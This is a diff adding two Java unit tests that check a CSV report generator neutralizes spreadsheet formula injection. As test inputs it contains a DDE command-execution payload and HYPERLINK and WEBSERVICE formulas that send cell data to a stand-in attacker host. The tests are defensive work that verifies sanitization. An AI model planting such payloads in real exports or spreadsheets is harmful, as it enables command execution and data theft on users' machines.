@@ -17,6 +17,7 @@ import java.util.Date;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.Properties;
 
 import static org.junit.Assert.assertEquals;
 import static org.junit.Assert.assertNotNull;
@@ -180,6 +181,44 @@ public class CsvReportGeneratorTest {
 
         assertTrue("File name should contain sanitized report name",
                 csv.getName().startsWith("monthly_security_audit_"));
+    }
+
+    @Test
+    public void formulaPayloadsFromUpstreamDataAreNeutralized() throws IOException {
+        Report report = buildReport("Audit Injection Report");
+        List<Map<String, Object>> data = new ArrayList<Map<String, Object>>();
+        Map<String, Object> row = new LinkedHashMap<String, Object>();
+        row.put("user_id", "@SUM(1+1)*cmd|' /C calc'!A0");
+        row.put("action", "=HYPERLINK(\"http://attacker.example/?\"&A1,\"click\")");
+        row.put("resource_type", "+1");
+        row.put("resource_id", "-1+2");
+        row.put("note", "\t=1");
+        row.put("delta", Integer.valueOf(-5));
+        row.put("=header", "LOGIN");
+        data.add(row);
+
+        File csv = generator.generateCsv(report, data, outputDir.getAbsolutePath());
+        List<String> lines = readAllLines(csv);
+
+        String headerLine = lines.get(lines.size() - 2);
+        String dataLine = lines.get(lines.size() - 1);
+        assertEquals("\"user_id\",\"action\",\"resource_type\",\"resource_id\",\"note\",\"delta\",\"'=header\"",
+                headerLine);
+        assertEquals("\"'@SUM(1+1)*cmd|' /C calc'!A0\","
+                + "\"'=HYPERLINK(\"\"http://attacker.example/?\"\"&A1,\"\"click\"\")\","
+                + "\"'+1\",\"'-1+2\",\"'\t=1\",\"-5\",\"LOGIN\"", dataLine);
+    }
+
+    @Test
+    public void formulaPayloadInReportNameIsNeutralizedInBanner() throws IOException {
+        Properties templates = new Properties();
+        templates.setProperty("banner.title", "${reportName}");
+        CsvReportGenerator bannerGenerator = new CsvReportGenerator(new ReportHeaderRenderer(templates));
+
+        File csv = bannerGenerator.generateCsv(buildReport("=WEBSERVICE(\"http://attacker.example\")"),
+                buildSampleData(1), outputDir.getAbsolutePath());
+
+        assertEquals("\"'=WEBSERVICE(\"\"http://attacker.example\"\")\"", readAllLines(csv).get(0));
     }
 
     // ---- Helpers ----
